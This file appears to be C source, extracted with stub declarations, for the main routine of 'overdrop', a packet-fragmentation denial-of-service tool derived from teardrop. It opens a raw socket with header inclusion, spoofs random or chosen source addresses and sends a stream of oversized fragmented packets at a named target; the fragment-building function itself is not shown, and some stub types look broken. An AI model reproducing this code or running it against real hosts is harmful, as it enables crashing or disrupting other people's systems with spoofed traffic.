#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  u_short ;
typedef  void* u_long ;
typedef  int /*<<< orphan*/  time_t ;
struct in_addr {void* s_addr; } ;
typedef  int /*<<< orphan*/  one ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int COUNT ; 
 int EOF ; 
 int /*<<< orphan*/  IPPROTO_IP ; 
 int /*<<< orphan*/  IPPROTO_RAW ; 
 int /*<<< orphan*/  IP_HDRINCL ; 
 int /*<<< orphan*/  SOCK_RAW ; 
 int atoi (char*) ; 
 int /*<<< orphan*/  exit (int) ; 
 int /*<<< orphan*/  fprintf (int /*<<< orphan*/ ,char*,...) ; 
 int getopt (int,char**,char*) ; 
 char* inet_ntoa (struct in_addr) ; 
 void* name_resolve (char*) ; 
 char* optarg ; 
 int /*<<< orphan*/  perror (char*) ; 
 void* rand () ; 
 int /*<<< orphan*/  send_frags (int,void*,void*,void*,void*) ; 
 scalar_t__ setsockopt (int,int /*<<< orphan*/ ,int /*<<< orphan*/ ,char*,int) ; 
 int socket (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  srandom (unsigned int) ; 
 int /*<<< orphan*/  stderr ; 
 scalar_t__ time (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  usage (char*) ; 
 int /*<<< orphan*/  usleep (int) ; 

int main(int argc, char **argv) {
      int one=1,count=0,i,rip_sock;
      u_long  src_ip=0,dst_ip=0;
      u_short src_prt=0,dst_prt=0;
      struct in_addr addr;
      fprintf(stderr,"overdrop by lcamtuf [based on teardrop by route|daemon9]\n\n");
      if((rip_sock=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))<0) {
        perror("raw socket");
        exit(1);
      }
      if (setsockopt(rip_sock,IPPROTO_IP,IP_HDRINCL,(char *)&one,sizeof(one))<0) {
        perror("IP_HDRINCL");
        exit(1);
      }
      if (argc < 2) usage(argv[0]);
      if (!(dst_ip=name_resolve(argv[1]))) {
        fprintf(stderr,"Can't resolve destination address.\n");
        exit(1);
      }
      while ((i=getopt(argc,argv,"s:n:"))!=EOF) {
        switch (i) {
	case 'n':
            count   = atoi(optarg);
            break;
	case 's':
	  if (!(src_ip=name_resolve(optarg))) {
              fprintf(stderr,"Can't resolve source address.\n");
              exit(1);
	  }
            break;
	default:
            usage(argv[0]);
            break;
        }
      }
      srandom((unsigned)(time((time_t)0)));
      if (!count) count=COUNT;
      fprintf(stderr,"Sending oversized packets:\nFrom: ");
      if (!src_ip) fprintf(stderr,"       (random)"); else {
        addr.s_addr = src_ip;
        fprintf(stderr,"%15s",inet_ntoa(addr));
      }
      addr.s_addr = dst_ip;
      fprintf(stderr,"\n  To: %15s\n",inet_ntoa(addr));
      fprintf(stderr," Amt: %5d\n",count);
      fprintf(stderr,"[ ");
      for (i=0;i<count;i++) {
        if (!src_ip) send_frags(rip_sock,rand(),dst_ip,rand(),rand()); else
          send_frags(rip_sock,src_ip,dst_ip,rand(),rand());
        fprintf(stderr, "b00z ");
        usleep(500);
      }
      fprintf(stderr, "]\n");
      return (0);
}